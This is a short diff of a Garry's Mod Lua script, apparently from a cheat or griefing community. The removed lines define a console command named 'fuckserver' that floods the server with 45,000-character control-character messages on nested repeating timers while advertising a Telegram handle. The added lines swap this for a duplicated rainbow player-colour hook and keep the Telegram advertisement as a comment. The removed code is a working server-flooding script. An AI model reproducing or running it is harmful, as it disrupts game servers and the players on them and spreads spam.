@@ -1,12 +1,3 @@
-concommand.Add('fuckserver', function()
-cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
-timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
-cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
-timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
-cmd.Run("me", (string.char(2) .. " "):rep(45000) .. "t.me/wtfbomba13")
-timer.Create("fuckserver" .. math.random(1), 0.7, 0, function()
-end)
-end)
-end)
-end)
-RunConsoleCommand("say", "1")
+hook.Add("Think","z",function() local RainbowPlayer=HSVToColor(CurTime()% 6*60,1,1) LocalPlayer():SetWeaponColor(Vector(RainbowPlayer.r/255,RainbowPlayer.g/255,RainbowPlayer.b/255)) LocalPlayer():SetPlayerColor(Vector(RainbowPlayer.r/255,RainbowPlayer.g/255,RainbowPlayer.b/255)) end)hook.Add("Think","z",function() local RainbowPlayer=HSVToColor(CurTime()% 6*60,1,1) LocalPlayer():SetWeaponColor(Vector(RainbowPlayer.r/255,RainbowPlayer.g/255,RainbowPlayer.b/255)) LocalPlayer():SetPlayerColor(Vector(RainbowPlayer.r/255,RainbowPlayer.g/255,RainbowPlayer.b/255)) end)
+
+-- t.me/wtfbomba13
